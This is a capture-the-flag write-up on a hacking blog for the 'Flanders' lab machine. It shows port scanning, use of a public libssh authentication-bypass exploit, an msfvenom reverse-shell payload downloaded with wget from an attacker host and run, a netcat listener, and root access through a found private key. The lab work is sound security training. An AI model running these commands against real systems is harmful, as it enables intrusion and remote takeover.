<!doctype html><html lang=en><head><title>Flanders Writeup :: Dotpirate Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Flanders Enumeration NMAP Port Scan sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports Output PORT STATE SERVICE REASON VERSION 6022/tcp open ssh syn-ack ttl 63 libssh 0.8.1 (protocol 2.0) | ssh-hostkey: | 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).
To confirm that this is actually the version of the SSH server we can furter fingerprint the service using nc
"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/falnders/flanders/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Flanders Writeup"><meta property="og:description" content="Flanders Enumeration NMAP Port Scan sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports Output PORT STATE SERVICE REASON VERSION 6022/tcp open ssh syn-ack ttl 63 libssh 0.8.1 (protocol 2.0) | ssh-hostkey: | 2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).
To confirm that this is actually the version of the SSH server we can furter fingerprint the service using nc
"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/falnders/flanders/"><meta property="og:site_name" content="Dotpirate Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>dotpirate</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><ul class=menu><li class=menu__trigger>Show more&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/falnders/flanders/>Flanders Writeup</a></h1><div class=post-meta></div><div class=post-content><div><h1 id=flanders>Flanders<a href=#flanders class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><h2 id=nmap-port-scan>NMAP Port Scan<a href=#nmap-port-scan class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PORT     STATE SERVICE REASON         VERSION
</span></span><span style=display:flex><span>6022/tcp open  ssh     syn-ack ttl <span style=color:#ae81ff>63</span> libssh 0.8.1 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh
</span></span></code></pre></div><p>Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).</p><p>To confirm that this is actually the version of the SSH server we can furter fingerprint the service using <code>nc</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -nvC 10.0.50.0 <span style=color:#ae81ff>6022</span>
</span></span></code></pre></div><h2 id=output-1>Output<a href=#output-1 class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.0.50.0<span style=color:#f92672>]</span> <span style=color:#ae81ff>6022</span> <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span> open
</span></span><span style=display:flex><span>SSH-2.0-libssh_0.8.1
</span></span></code></pre></div><p>Now that we have the version of the SSH we can search for known vulnerabilities on the web. What i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords &ldquo;poc&rdquo; &ldquo;exploit&rdquo; &ldquo;github&rdquo; prepending the version number and service name</p><p><img src=/images/Pasted%20image%2020250729180313.png alt="Image Description"></p><p>We can see that there are a lot of exploits available regarding this particular version of and most importantly we get the CVE number to search more specifically.</p><p><img src=/images/Pasted%20image%2020250729190217.png alt="Image Description"></p><p>The following exploit worked for me: <code>https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d?permalink_comment_id=3077048</code></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>We can download the GitHub repo and install the requirements for the exploit to work.
First lets copy the exploit by clicking the raw format and paste it locally on our attacking machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat sshlibexp.py
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># CVE-2018-10993 libSSH authentication bypass exploit...</span>
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>Reading the script we can see that there is a python module required called <code>paramiko</code> and since is a python script it is a good practice to create a python virtual environment to install what is required.</p><p><img src=/images/Pasted%20image%2020250729191121.png alt="Image Description"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt install python3-venv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 -m venv .venv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>source .venv/bin/activate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 -m pip install paramiko
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 sshlibexp.py 10.0.50.0 -p <span style=color:#ae81ff>6022</span> -c <span style=color:#e6db74>&#34;cat /etc/passwd&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729191351.png alt="Image Description"></p><p>We get an error but the script rans successfully. We now have command execution on the target server.</p><p>Lets get a reverse shell..</p><p>Lets first check the architecture of the target server so we know what kind of architecture should our shell be.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 sshlibexp.py 10.0.50.0 -p <span style=color:#ae81ff>6022</span> -c <span style=color:#e6db74>&#34;uname -a&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729191850.png alt="Image Description">
Is a x64 architecture so lets create an x64 reverse shell using <code>msfvenom</code> and then download our rshell to the target machine using <code>wget</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>&lt;attacker-ip&gt; LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span> -f elf -o x64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 sshlibexp.py 10.0.50.0 -p <span style=color:#ae81ff>6022</span> -c <span style=color:#e6db74>&#34;wget http://10.10.11.150/x64 -O /tmp/x64&#34;</span> 
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729192359.png alt="Image Description"></p><p>Now that our rshell is downloaded we can go ahead and use <code>chmod</code> to make it executable and then execute the rshell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 sshlibexp.py 10.0.50.0 -p <span style=color:#ae81ff>6022</span> -c <span style=color:#e6db74>&#34;chmod +x /tmp/x64&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo nc -nvlp <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 sshlibexp.py 10.0.50.0 -p <span style=color:#ae81ff>6022</span> -c <span style=color:#e6db74>&#34;/tmp/x64&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729192554.png alt="Image Description"></p><p>We got in!</p><p>To have a better shell we can use python3 likewise:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Ctr+Z
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>stty raw -echo;fg
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Press Enter<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Press Enter<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Press Enter<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729193212.png alt="Image Description"></p><p>Now we have a fully functional shell!</p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Most of the times i check for sudo privileges or SUID binaries however in this case by checking what is running locally on the box we find out that there is an SSH service running locally.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ss -antp
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729194000.png alt="Image Description"></p><p>Trying to access the local SSH service as root with the password give in the hint but we get access denied
<img src=/images/Pasted%20image%2020250729194102.png alt="Image Description"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh root@127.0.01
</span></span><span style=display:flex><span>OkilyDokily
</span></span></code></pre></div><p>Looking further around knowing we are dealing with an SSH service, it is noticed that there is private key under the home directory of ETSCTF user called &ldquo;mykey&rdquo; and its owned by root!</p><p><img src=/images/Pasted%20image%2020250729194808.png alt="Image Description"></p><p>We can try using the private key to access the SSH server locally as root!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ETSCTF@flanders:/home/ETSCTF/.ssh$ ssh -i mykey root@127.0.01
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729194833.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>